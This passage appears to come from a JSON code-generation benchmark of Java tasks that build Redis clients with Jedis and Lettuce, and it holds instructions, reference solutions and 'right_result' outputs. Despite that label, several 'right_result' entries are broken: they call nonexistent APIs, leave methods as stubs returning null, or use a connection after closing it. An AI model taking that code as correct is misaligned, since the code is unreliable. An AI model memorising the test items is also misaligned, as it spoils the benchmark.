      int port = Integer.parseInt(addr.substring(i + 1));\n            this.jedisPools.put(addr, new JedisPool(new JedisPoolConfig(), host, port, Constants.DEFAULT_TIMEOUT));\n        }\n    }\n\n    protected void doRegister(Node node) {\n        String key = NodeRegistryUtils.getNodeTypePath(clusterName, node.getNodeType());\n        boolean success = false;\n        NodeRegistryException exception = null;\n        for (Map.Entry<String, JedisPool> entry : jedisPools.entrySet()) {\n            JedisPool jedisPool = entry.getValue();\n            try {\n                Jedis jedis = jedisPool.getResource();\n                try {\n                    jedis.hset(key, node.toFullString(), String.valueOf(SystemClock.now() + Constants.DEFAULT_SESSION_TIMEOUT));\n                    jedis.publish(key, Constants.REGISTER);\n                    success = true;\n                    if (!replicate) {\n                        break;\n                    }\n                } finally {\n                    jedis.close();\n                }\n            } catch (Throwable t) {\n                exception = new NodeRegistryException(\"Failed to register node to redis registry. registry: \" + entry.getKey() + \", node: \" + node + \", cause: \" + t.getMessage(), t);\n            }\n        }\n        if (exception != null && !success) {\n            throw exception;\n        }\n    }\n\n    protected void doSubscribe(Node node, NotifyListener listener) {\n        List<NodeType> listenNodeTypes = node.getListenNodeTypes();\n        if (CollectionUtils.isEmpty(listenNodeTypes)) {\n            return;\n        }\n        for (NodeType listenNodeType : listenNodeTypes) {\n            String listenNodePath = NodeRegistryUtils.getNodeTypePath(clusterName, listenNodeType);\n            Notifier notifier = notifiers.get(listenNodePath);\n            if (notifier == null) {\n                Notifier newNotifier = new Notifier(listenNodePath);\n                notifiers.putIfAbsent(listenNodePath, newNotifier);\n                notifier = notifiers.get(listenNodePath);\n                if (notifier == newNotifier) {\n                    notifier.start();\n                }\n            }\n        }\n    }\n\n    private class NotifySub extends JedisPubSub {\n        private final JedisPool jedisPool;\n\n        public NotifySub(JedisPool jedisPool) {\n            this.jedisPool = jedisPool;\n        }\n\n        @Override\n        public void onMessage(String key, String msg) {\n            if (msg.equals(Constants.REGISTER) || msg.equals(Constants.UNREGISTER)) {\n                try {\n                    Jedis jedis = jedisPool.getResource();\n                    try {\n                        doNotify(jedis, key);\n                    } finally {\n                        jedis.close();\n                    }\n                } catch (Throwable t) {\n                    LOGGER.error(t.getMessage(), t);\n                }\n            }\n        }\n    }\n\n    private class Notifier extends Thread {\n        private final String listenNodePath;\n        private volatile Jedis jedis;\n        private volatile boolean running = true;\n\n        public Notifier(String listenNodePath) {\n            super.setDaemon(true);\n            super.setName(\"LTSRedisSubscribe\");\n            this.listenNodePath = listenNodePath;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (running) {\n                    for (Map.Entry<String, JedisPool> entry : jedisPools.entrySet()) {\n                        try {\n                            JedisPool jedisPool = entry.getValue();\n                            jedis = jedisPool.getResource();\n                            try {\n                                jedis.subscribe(new NotifySub(jedisPool), listenNodePath);\n                                break;\n                            } finally {\n                                jedis.close();\n                            }\n                        } catch (Throwable t) {\n                            LOGGER.warn(\"Failed to subscribe node from redis registry. registry: \" + entry.getKey(), t);\n                        }\n                    }\n                }\n            } catch (Throwable t) {\n                LOGGER.error(t.getMessage(), t);\n            }\n        }\n\n        public void shutdown() {\n            try {\n                running = false;\n                jedis.disconnect();\n            } catch (Throwable t) {\n                LOGGER.warn(t.getMessage(), t);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.JedisPubSub;\n\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\n\npublic class RedisRegistry {\n    private ConcurrentHashMap<String, JedisPool> jedisPools;\n    private String clusterName;\n    private boolean replicate;\n    private ConcurrentMap<String, Notifier> notifiers;\n\n    public RedisRegistry(AppContext appContext) {\n        this.jedisPools = new ConcurrentHashMap<>();\n        this.clusterName = appContext.getClusterName();\n        this.replicate = appContext.isReplicate();\n        this.notifiers = new ConcurrentHashMap<>();\n    }\n\n    protected void doRegister(Node node) throws NodeRegistryException {\n        try (Jedis jedis = getJedis(node.getServerAddress())) {\n            jedis.set(node.getPath(), node.getValue());\n            if (replicate) {\n                replicateToAllServers(jedis, node);\n            }\n        } catch (Exception e) {\n            throw new NodeRegistryException(\"Failed to register node\", e);\n        }\n    }\n\n    protected void doSubscribe(Node node, NotifyListener listener) {\n        NotifySub notifySub = new NotifySub(node.getPath(), listener);\n        Notifier notifier = new Notifier(notifySub);\n        notifiers.put(node.getPath(), notifier);\n        notifier.start();\n    }\n\n    private Jedis getJedis(String address) {\n        return jedisPools.computeIfAbsent(address, addr -> {\n            JedisPoolConfig poolConfig = new JedisPoolConfig();\n            return new JedisPool(poolConfig, addr);\n        }).getResource();\n    }\n\n    private void replicateToAllServers(Jedis jedis, Node node) {\n        for (String address : jedisPools.keySet()) {\n            if (!address.equals(jedis.getClient().getHostAndPort())) {\n                try (Jedis otherJedis = getJedis(address)) {\n                    otherJedis.set(node.getPath(), node.getValue());\n                }\n            }\n        }\n    }\n\n    static class NotifySub extends JedisPubSub {\n        private String path;\n        private NotifyListener listener;\n\n        public NotifySub(String path, NotifyListener listener) {\n            this.path = path;\n            this.listener = listener;\n        }\n\n        @Override\n        public void onMessage(String key, String msg) {\n            if (key.equals(path)) {\n                listener.onNotify(msg);\n            }\n        }\n    }\n\n    static class Notifier extends Thread {\n        private JedisPubSub sub;\n        private volatile boolean running = true;\n\n        public Notifier(JedisPubSub sub) {\n            this.sub = sub;\n        }\n\n        @Override\n        public void run() {\n            while (running) {\n                try (Jedis jedis = sub.getChannel().equals(\"\") ? null : getJedis(sub.getChannel())) {\n                    jedis.subscribe(sub, sub.getChannel());\n                } catch (Exception e) {\n                    // Handle exception\n                }\n            }\n        }\n\n        public void shutdown() {\n            running = false;\n            interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 313,
    "Instruction": "Task Description: Create a Redis connection manager class in Java using Lettuce client that handles connection setup, management, and cleanup.\n\nClass Description: RedisConnectionManager is a utility class that manages Redis connections using Lettuce client. It provides methods to establish a connection with configurable timeout options, retrieve the active connection, and properly close the connection when no longer needed.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used to create connections\n- connection: StatefulRedisConnection<byte[], byte[]> - The active Redis connection using byte array codec\n\nMethods:\n- setupConnection(String host, int port) -> void - Initializes the Redis client and establishes a connection to the specified Redis server with a 10-second timeout configuration\n- closeConnection() -> void - Properly closes the active connection and shuts down the Redis client\n- getConnection() -> StatefulRedisConnection<byte[], byte[]> - Returns the active Redis connection instance",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport java.time.Duration;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n\n    public void setupConnection(String host, int port) {\n        redisClient = RedisClient.create(RedisURI.create(host, port));\n        redisClient.setOptions(ClientOptions.builder()\n                .timeoutOptions(TimeoutOptions.builder().fixedTimeout(Duration.ofSeconds(10)).build()).build());\n        connection = redisClient.connect(ByteArrayCodec.INSTANCE);\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown(0, 0, TimeUnit.SECONDS);\n        }\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisConnectionManager {\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n\n    public void setupConnection(String host, int port) {\n        redisClient = RedisClient.create(\"redis://\" + host + \":\" + port);\n        connection = redisClient.connect();\n        connection.setAutoReconnect(false);\n        connection.setOptions(connection.getOptions()\n                .copy()\n                .timeout(10, TimeUnit.SECONDS));\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n}\n```"
  },
  {
    "Task_id": 314,
    "Instruction": "Task Description: Implement a Redis cluster connection provider in Java that manages connections to a Redis cluster, handles slot-based routing, and provides connection pooling functionality.\n\nClass Description: ClusterConnectionProvider is a connection management class for Redis clusters that maintains a cache of cluster nodes and slots, provides connections based on slot hashing, and handles connection failures with retry logic.\n\nAttributes:\n- cache: JedisClusterInfoCache - Maintains information about cluster nodes, slots, and connection pools\n\nMethods:\n- initializeSlotsCache(Set<HostAndPort>, JedisClientConfig) -> void - Initializes the cluster slots cache by connecting to seed nodes and discovering cluster topology\n- getConnection(CommandArguments) -> Connection - Retrieves a connection based on command arguments (slot-aware)\n- getConnection() -> Connection - Gets a random connection from available cluster nodes\n- getConnectionFromSlot(int) -> Connection - Gets a connection specifically for a given hash slot\n- renewSlotCache() -> void - Refreshes the cluster slots information\n- close() -> void - Closes all connections and releases resources\n- getConnectionMap() -> Map<String, ConnectionPool> - Returns an unmodifiable map of all node connections",
    "Canonical_solution": "import java.time.Duration;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Set;\nimport java.util.concurrent.ThreadLocalRandom;\n\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\n\nimport redis.clients.jedis.ClusterCommandArguments;\nimport redis.clients.jedis.CommandArguments;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.JedisClusterInfoCache;\nimport redis.clients.jedis.exceptions.JedisClusterOperationException;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class ClusterConnectionProvider implements ConnectionProvider {\n\n  protected final JedisClusterInfoCache cache;\n\n  public ClusterConnectionProvider(Set<HostAndPort> clusterNodes, JedisClientConfig clientConfig) {\n    this.cache = new JedisClusterInfoCache(clientConfig, clusterNodes);\n    initializeSlotsCache(clusterNodes, clientConfig);\n  }\n\n  private void initializeSlotsCache(Set<HostAndPort> startNodes, JedisClientConfig clientConfig) {\n    if (startNodes.isEmpty()) {\n      throw new JedisClusterOperationException(\"No nodes to initialize cluster slots cache.\");\n    }\n\n    ArrayList<HostAndPort> startNodeList = new ArrayList<>(startNodes);\n    Collections.shuffle(startNodeList);\n\n    JedisException firstException = null;\n    for (HostAndPort hostAndPort : startNodeList) {\n      try (Connection jedis = new Connection(hostAndPort, clientConfig)) {\n        cache.discoverClusterNodesAndSlots(jedis);\n        return;\n      } catch (JedisException e) {\n        if (firstException == null) {\n          firstException = e;\n        }\n      }\n    }\n\n    JedisClusterOperationException uninitializedException\n        = new JedisClusterOperationException(\"Could not initialize cluster slots cache.\");\n    uninitializedException.addSuppressed(firstException);\n    throw uninitializedException;\n  }\n\n  @Override\n  public Connection getConnection(CommandArguments args) {\n    final int slot = ((ClusterCommandArguments) args).getCommandHashSlot();\n    return slot >= 0 ? getConnectionFromSlot(slot) : getConnection();\n  }\n\n  @Override\n  public Connection getConnection() {\n    List<ConnectionPool> pools = cache.getShuffledNodesPool();\n\n    JedisException suppressed = null;\n    for (ConnectionPool pool : pools) {\n      Connection jedis = null;\n      try {\n        jedis = pool.getResource();\n        if (jedis == null) {\n          continue;\n        }\n\n        jedis.ping();\n        return jedis;\n\n      } catch (JedisException ex) {\n        if (suppressed == null) {\n          suppressed = ex;\n        }\n        if (jedis != null) {\n          jedis.close();\n        }\n      }\n    }\n\n    JedisClusterOperationException noReachableNode = new JedisClusterOperationException(\"No reachable node in cluster.\");\n    if (suppressed != null) {\n      noReachableNode.addSuppressed(suppressed);\n    }\n    throw noReachableNode;\n  }\n\n  public Connection getConnectionFromSlot(int slot) {\n    ConnectionPool connectionPool = cache.getSlotPool(slot);\n    if (connectionPool != null) {\n      return connectionPool.getResource();\n    } else {\n      renewSlotCache();\n      connectionPool = cache.getSlotPool(slot);\n      if (connectionPool != null) {\n        return connectionPool.getResource();\n      } else {\n        return getConnection();\n      }\n    }\n  }\n\n  public void renewSlotCache() {\n    cache.renewClusterSlots(null);\n  }\n\n  @Override\n  public void close() {\n    cache.close();\n  }\n\n  @Override\n  public Map<String, ConnectionPool> getConnectionMap() {\n    return Collections.unmodifiableMap(cache.getNodes());\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.JedisClusterInfoCache;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.exceptions.JedisException;\nimport java.util.Set;\nimport java.util.Map;\n\npublic class ClusterConnectionProvider {\n    private JedisCluster jedisCluster;\n    private JedisClusterInfoCache cache;\n\n    public void initializeSlotsCache(Set<HostAndPort> seeds, JedisClientConfig config) {\n        this.cache = new JedisClusterInfoCache();\n        this.jedisCluster = new JedisCluster(seeds, config);\n    }\n\n    public Connection getConnection(CommandArguments args) {\n        int slot = args.getSlot();\n        return getConnectionFromSlot(slot);\n    }\n\n    public Connection getConnection() {\n        HostAndPort node = cache.getRandomNode();\n        return jedisCluster.getConnection(node.getHost(), node.getPort());\n    }\n\n    public Connection getConnectionFromSlot(int slot) {\n        HostAndPort node = cache.getNodeBySlot(slot);\n        if (node == null) {\n            throw new JedisException(\"No node found for slot \" + slot);\n        }\n        return jedisCluster.getConnection(node.getHost(), node.getPort());\n    }\n\n    public void renewSlotCache() {\n        cache.renewCache(jedisCluster);\n    }\n\n    public void close() {\n        jedisCluster.close();\n    }\n\n    public Map<String, ConnectionPool> getConnectionMap() {\n        return cache.getConnectionMap();\n    }\n}\n```"
  },
  {
    "Task_id": 315,
    "Instruction": "Task Description: Implement a Redis connection class in Java that handles socket communication, authentication, and basic Redis operations while managing connection state and resources.\n\nClass Description: The Connection class represents a Redis client connection that manages socket communication with a Redis server. It handles connection establishment, command sending, response reading, and connection cleanup. The class implements Closeable for proper resource management.\n\nAttributes:\n- socketFactory: JedisSocketFactory - Factory for creating socket connections to Redis\n- socket: Socket - The underlying socket connection to Redis\n- outputStream: RedisOutputStream - Output stream for sending commands to Redis\n- inputStream: RedisInputStream - Input stream for reading responses from Redis\n- soTimeout: int - Socket timeout setting\n- broken: boolean - Flag indicating if the connection is in a broken state\n- currentCredentials: AtomicReference<RedisCredentials> - Current authentication credentials\n- authXManager: AuthXManager - Manager for authentication operations\n\nMethods:\n- Connection(JedisSocketFactory) -> void - Constructor that initializes with a socket factory\n- connect() -> void - Establishes connection to Redis server\n- disconnect() -> void - Closes the connection to Redis server\n- isConnected() -> boolean - Checks if connection is active\n- isBroken() -> boolean - Checks if connection is in broken state\n- setBroken() -> void - Marks connection as broken\n- sendCommand(ProtocolCommand, byte[]...) -> void - Sends a Redis command with arguments\n- getOne() -> Object - Reads and returns a single response from Redis\n- flush() -> void - Flushes the output stream\n- readProtocolWithCheckingBroken() -> Object - Reads protocol response while checking connection state\n- close() -> void - Implements Closeable interface to disconnect (alias for disconnect)",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Arrays;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport redis.clients.jedis.Protocol;\nimport redis.clients.jedis.Protocol.Command;\nimport redis.clients.jedis.Protocol.Keyword;\nimport redis.clients.jedis.args.Rawable;\nimport redis.clients.jedis.authentication.AuthXManager;\nimport redis.clients.jedis.commands.ProtocolCommand;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisDataException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.IOUtils;\nimport redis.clients.jedis.util.RedisInputStream;\nimport redis.clients.jedis.util.RedisOutputStream;\n\npublic class Connection implements Closeable {\n\n  private final JedisSocketFactory socketFactory;\n  private Socket socket;\n  private RedisOutputStream outputStream;\n  private RedisInputStream inputStream;\n  private int soTimeout = 0;\n  private boolean broken = false;\n  private AtomicReference<RedisCredentials> currentCredentials = new AtomicReference<>(null);\n  private AuthXManager authXManager;\n\n  public Connection(final JedisSocketFactory socketFactory) {\n    this.socketFactory = socketFactory;\n  }\n\n  public void connect() throws JedisConnectionException {\n    if (!isConnected()) {\n      try {\n        socket = socketFactory.createSocket();\n        outputStream = new RedisOutputStream(socket.getOutputStream());\n        inputStream = new RedisInputStream(socket.getInputStream());\n        broken = false;\n      } catch (JedisConnectionException jce) {\n        setBroken();\n        throw jce;\n      } catch (IOException ioe) {\n        setBroken();\n        throw new JedisConnectionException(\"Failed to create input/output stream\", ioe);\n      } finally {\n        if (broken) {\n          IOUtils.closeQuietly(socket);\n        }\n      }\n    }\n  }\n\n  public void disconnect() {\n    if (isConnected()) {\n      try {\n        outputStream.flush();\n        socket.close();\n      } catch (IOException ex) {\n        throw new JedisConnectionException(ex);\n      } finally {\n        IOUtils.closeQuietly(socket);\n        setBroken();\n      }\n    }\n  }\n\n  public boolean isConnected() {\n    return socket != null && socket.isBound() && !socket.isClosed() && socket.isConnected()\n        && !socket.isInputShutdown() && !socket.isOutputShutdown();\n  }\n\n  public boolean isBroken() {\n    return broken;\n  }\n\n  public void setBroken() {\n    broken = true;\n  }\n\n  public void sendCommand(final ProtocolCommand cmd, final byte[]... args) {\n    try {\n      connect();\n      Protocol.sendCommand(outputStream, new CommandArguments(cmd).addObjects((Object[]) args));\n    } catch (JedisConnectionException ex) {\n      setBroken();\n      throw ex;\n    }\n  }\n\n  public Object getOne() {\n    flush();\n    return readProtocolWithCheckingBroken();\n  }\n\n  protected void flush() {\n    try {\n      outputStream.flush();\n    } catch (IOException ex) {\n      setBroken();\n      throw new JedisConnectionException(ex);\n    }\n  }\n\n  protected Object readProtocolWithCheckingBroken() {\n    if (broken) {\n      throw new JedisConnectionException(\"Attempting to read from a broken connection.\");\n    }\n    try {\n      return Protocol.read(inputStream);\n    } catch (JedisConnectionException exc) {\n      broken = true;\n      throw exc;\n    }\n  }\n\n  @Override\n  public void close() {\n    disconnect();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Protocol;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.params.AuthParams;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class Connection implements AutoCloseable {\n    private final JedisSocketFactory socketFactory;\n    private Socket socket;\n    private RedisOutputStream outputStream;\n    private RedisInputStream inputStream;\n    private int soTimeout = 2000;\n    private boolean broken = false;\n    private final AtomicReference<RedisCredentials> currentCredentials;\n    private final AuthXManager authXManager;\n\n    public Connection(JedisSocketFactory socketFactory) {\n        this.socketFactory = socketFactory;\n        this.currentCredentials = new AtomicReference<>();\n        this.authXManager = new AuthXManager();\n    }\n\n    public void connect() throws IOException {\n        socket = socketFactory.createSocket();\n        socket.setSoTimeout(soTimeout);\n        outputStream = new RedisOutputStream(socket.getOutputStream());\n        inputStream = new RedisInputStream(socket.getInputStream());\n    }\n\n    public void disconnect() {\n        try {\n            if (outputStream != null) {\n                outputStream.close();\n            }\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            if (socket != null && !socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // Handle exception\n        }\n    }\n\n    public boolean isConnected() {\n        return socket != null && !socket.isClosed();\n    }\n\n    public boolean isBroken() {\n        return broken;\n    }\n\n    public void setBroken() {\n        broken = true;\n    }\n\n    public void sendCommand(ProtocolCommand cmd, byte[]... args) throws IOException {\n        if (broken) throw new JedisConnectionException(\"Connection is broken\");\n        outputStream.write(cmd.getValue(), 0, cmd.getValue().length);\n        outputStream.write(args);\n        outputStream.flush();\n    }\n\n    public Object getOne() throws IOException {\n        return readProtocolWithCheckingBroken();\n    }\n\n    public void flush() throws IOException {\n        outputStream.flush();\n    }\n\n    public Object readProtocolWithCheckingBroken() throws IOException {\n        if (broken) throw new JedisConnectionException(\"Connection is broken\");\n        return Protocol.read(inputStream);\n    }\n\n    @Override\n    public void close() throws IOException {\n        disconnect();\n    }\n}\n```"
  },
  {
    "Task_id": 316,
    "Instruction": "Task Description: Implement a Redis Sentinel-based connection provider in Java that can discover and connect to the current Redis master node through Sentinel servers.\n\nClass Description: SentineledConnectionProvider is a utility class that manages Redis connections in a Sentinel environment. It discovers the current master node through Sentinel servers and establishes connections to it.\n\nAttributes:\n- masterName: String - The name of the Redis master node as configured in Sentinel\n- masterConfig: JedisClientConfig - Configuration for connecting to the Redis master\n- sentinels: Set<HostAndPort> - Set of Sentinel server addresses (host and port)\n- sentinelConfig: JedisClientConfig - Configuration for connecting to Sentinel servers\n\nMethods:\n- getConnection() -> Connection - Discovers the current master node through Sentinel and returns an established connection to it\n- discoverMaster() -> HostAndPort - Internal method that queries Sentinel servers to find the current master node's address\n- close() -> void - Cleans up any resources (currently a placeholder for future implementation)\n\nInput: \n- Constructor parameters:\n  - masterName: String\n  - masterConfig: JedisClientConfig\n  - sentinels: Set<HostAndPort>\n  - sentinelConfig: JedisClientConfig\n\nOutput:\n- getConnection() returns a connected Connection object to the current Redis master\n- discoverMaster() returns the HostAndPort of the current master node\n- close() has no return value",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.Set;\nimport java.util.HashSet;\n\npublic class SentineledConnectionProvider {\n\n    private final String masterName;\n    private final JedisClientConfig masterConfig;\n    private final Set<HostAndPort> sentinels;\n    private final JedisClientConfig sentinelConfig;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterConfig,\n                                      Set<HostAndPort> sentinels, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.masterConfig = masterConfig;\n        this.sentinels = sentinels;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public Connection getConnection() {\n        try {\n            HostAndPort master = discoverMaster();\n            Connection connection = new Connection(master, masterConfig);\n            connection.connect();\n            return connection;\n        } catch (JedisException e) {\n            throw new JedisConnectionException(\"Failed to get connection from sentinel\", e);\n        }\n    }\n\n    private HostAndPort discoverMaster() {\n        for (HostAndPort sentinel : sentinels) {\n            try (Jedis jedis = new Jedis(sentinel, sentinelConfig)) {\n                String masterHost = jedis.sentinelGetMasterAddrByName(masterName).get(0);\n                int masterPort = Integer.parseInt(jedis.sentinelGetMasterAddrByName(masterName).get(1));\n                return new HostAndPort(masterHost, masterPort);\n            } catch (Exception e) {\n                continue;\n            }\n        }\n        throw new JedisException(\"Could not discover master from sentinels\");\n    }\n\n    public void close() {\n        // Cleanup resources if needed\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisSentinelPool;\n\nimport java.util.Set;\n\npublic class SentineledConnectionProvider {\n    private final String masterName;\n    private final JedisClientConfig masterConfig;\n    private final Set<HostAndPort> sentinels;\n    private final JedisClientConfig sentinelConfig;\n    private JedisSentinelPool jedisSentinelPool;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterConfig, Set<HostAndPort> sentinels, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.masterConfig = masterConfig;\n        this.sentinels = sentinels;\n        this.sentinelConfig = sentinelConfig;\n        this.jedisSentinelPool = new JedisSentinelPool(masterName, sentinels, sentinelConfig);\n    }\n\n    public Connection getConnection() {\n        try (Jedis jedis = jedisSentinelPool.getResource()) {\n            return jedis;\n        }\n    }\n\n    private HostAndPort discoverMaster() {\n        // Placeholder for actual discovery logic using JedisSentinelPool\n        return jedisSentinelPool.getMasterAddrByName(masterName);\n    }\n\n    public void close() {\n        if (jedisSentinelPool != null) {\n            jedisSentinelPool.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 317,
    "Instruction": "Task Description: Create a Java class that provides a client interface for interacting with Redis Search functionality, including index creation, document management, search operations, and aggregation.\n\nClass Description: The RedisSearchClient class encapsulates Redis Search operations using the Jedis client library. It manages a connection to Redis and provides methods for creating search indexes, adding JSON documents, performing searches, and running aggregations.\n\nAttributes:\n- jedis: JedisPooled - The pooled Redis client connection used for all operations\n\nMethods:\n- RedisSearchClient(String host, int port) -> void - Constructor that initializes the Redis connection with the specified host and port\n- createIndex(String indexName, String prefix, SchemaField[] schema) -> void - Creates a new search index with the given name, prefix, and schema definition\n- addDocument(String key, Object document) -> void - Adds a JSON document to Redis with the specified key\n- search(String indexName, Query query) -> List<Document> - Performs a search query on the specified index and returns matching documents\n- aggregate(String indexName, AggregationBuilder aggregationBuilder) -> AggregationResult - Executes an aggregation query on the specified index and returns the results\n- close() -> void - Closes the Redis connection and releases resources",
    "Canonical_solution": "import redis.clients.jedis.JedisPooled;\nimport redis.clients.jedis.search.*;\nimport redis.clients.jedis.search.aggr.*;\nimport redis.clients.jedis.search.schemafields.*;\n\npublic class RedisSearchClient {\n\n    private JedisPooled jedis;\n\n    public RedisSearchClient(String host, int port) {\n        this.jedis = new JedisPooled(host, port);\n    }\n\n    public void createIndex(String indexName, String prefix, SchemaField[] schema) {\n        jedis.ftCreate(indexName,\n            FTCreateParams.createParams()\n                .on(IndexDataType.JSON)\n                .addPrefix(prefix),\n            schema\n        );\n    }\n\n    public void addDocument(String key, Object document) {\n        jedis.jsonSetWithEscape(key, document);\n    }\n\n    public List<Document> search(String indexName, Query query) {\n        return jedis.ftSearch(indexName, query).getDocuments();\n    }\n\n    public AggregationResult aggregate(String indexName, AggregationBuilder aggregationBuilder) {\n        return jedis.ftAggregate(indexName, aggregationBuilder);\n    }\n\n    public void close() {\n        jedis.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.params.ScanParams;\nimport org.json.JSONObject;\n\npublic class RedisSearchClient {\n    private Jedis jedis;\n\n    public RedisSearchClient(String host, int port) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedis = new Jedis(host, port);\n    }\n\n    public void createIndex(String indexName, String prefix, SchemaField[] schema) {\n        // Implementation for creating a search index\n    }\n\n    public void addDocument(String key, Object document) {\n        if (document instanceof JSONObject) {\n            jedis.hset(key, \"data\", document.toString());\n        }\n    }\n\n    public List<Document> search(String indexName, Query query) {\n        // Implementation for executing a search query\n        return null;\n    }\n\n    public AggregationResult aggregate(String indexName, AggregationBuilder aggregationBuilder) {\n        // Implementation for executing an aggregation query\n        return null;\n    }\n\n    public void close() {\n        jedis.close();\n    }\n}\n```"
  },
  {
    "Task_id": 319,
    "Instruction": "Task Description: Create a singleton Redis client class that manages a single Redis connection instance throughout the application lifecycle, with automatic shutdown handling.\n\nClass Description: DefaultRedisClient is a singleton class that provides centralized Redis client management. It creates and maintains a single RedisClient instance, configures default timeout settings, and ensures proper resource cleanup during JVM shutdown.\n\nAttributes:\n- instance: DefaultRedisClient - The singleton instance of the class\n- redisClient: RedisClient - The underlying Redis client connection instance\n\nMethods:\n- get() -> RedisClient - Returns the singleton RedisClient instance after setting a default timeout of 60 seconds\n- DefaultRedisClient() (constructor) - Private constructor that initializes the RedisClient with connection settings and registers a shutdown hook\n- run() (in anonymous Thread class) - Shutdown hook method that cleans up Redis client resources during JVM shutdown",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.test.settings.TestSettings;\nimport java.util.concurrent.TimeUnit;\n\npublic class DefaultRedisClient {\n\n    private static final DefaultRedisClient instance = new DefaultRedisClient();\n\n    private RedisClient redisClient;\n\n    private DefaultRedisClient() {\n        redisClient = RedisClient.create(RedisURI.Builder.redis(TestSettings.host(), TestSettings.port()).build());\n        Runtime.getRuntime().addShutdownHook(new Thread() {\n            @Override\n            public void run() {\n                FastShutdown.shutdown(redisClient);\n            }\n        });\n    }\n\n    public static RedisClient get() {\n        instance.redisClient.setDefaultTimeout(60, TimeUnit.SECONDS);\n        return instance.redisClient;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\n\npublic class DefaultRedisClient {\n    private static DefaultRedisClient instance = new DefaultRedisClient();\n    private RedisClient redisClient;\n\n    private DefaultRedisClient() {\n        this.redisClient = RedisClient.create(\"redis://localhost\");\n        ((StatefulRedisConnection<?, ?>) redisClient.connect()).setTimeout(Duration.ofSeconds(60));\n        Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n            try {\n                redisClient.shutdown().get();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }));\n    }\n\n    public static RedisClient get() {\n        return instance.redisClient;\n    }\n}\n```"
  },
  {
    "Task_id": 324,
